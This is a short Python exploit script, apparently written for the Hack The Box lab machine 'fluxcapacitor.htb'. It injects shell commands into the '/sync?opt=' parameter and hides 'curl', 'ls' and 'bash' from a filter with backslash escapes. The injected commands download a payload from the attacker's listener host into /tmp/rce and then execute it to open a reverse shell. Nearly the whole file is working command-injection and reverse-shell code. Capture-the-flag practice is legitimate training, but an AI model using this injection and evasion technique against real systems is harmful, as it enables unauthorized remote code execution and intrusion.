#!/usr/bin/python3

import requests
import traceback
import sys
import argparse

def RevShell(lhost):
    url = f"http://fluxcapacitor.htb:80/sync?opt=' cur\l {lhost}:8080 -o /tmp/rce'"
    headers = {"User-Agent": "TheLongerWeDelayTheMoreWePay"}
    proxy = {"http": "http://127.0.0.1:8080"}
    try:
        print("[*] Please edit and host the index.html on port 8080")
        print("[*] Uploading backdoor...")
        requests.get(url, headers=headers, proxies=proxy)
        RceUrl = "http://fluxcapacitor.htb:80/sync?opt=' l\s /tmp/rce'"
        r = requests.get(RceUrl, headers=headers, proxies=proxy)
        if "/tmp/rce" in r.text:
            print("[+] Backdoor uploaded successfully")
            print("[*] Triggering the Reverse Shell, check your listener!")
            RevUrl = "http://fluxcapacitor.htb:80/sync?opt=' ba\s\h /tmp/rce'"
            print("[+] Reverse Shell triggered succefully!")
            requests.get(RevUrl, headers=headers, proxies=proxy)
        else:
            print("[-] Failed to upload the backdoor")
            sys.exit(1)
    except Exception as e:
        print("Error: ", e)
        traceback.print_exc()

def main():
    parser = argparse.ArgumentParser(description="Upload backdoor to the target machine")
    parser.add_argument("lhost", help="Listener IP address")
    args = parser.parse_args()

    RevShell(args.lhost)

    # Example Usage:
    # python3 rce_script.py 10.10.16.6

if __name__ == "__main__":
    main()
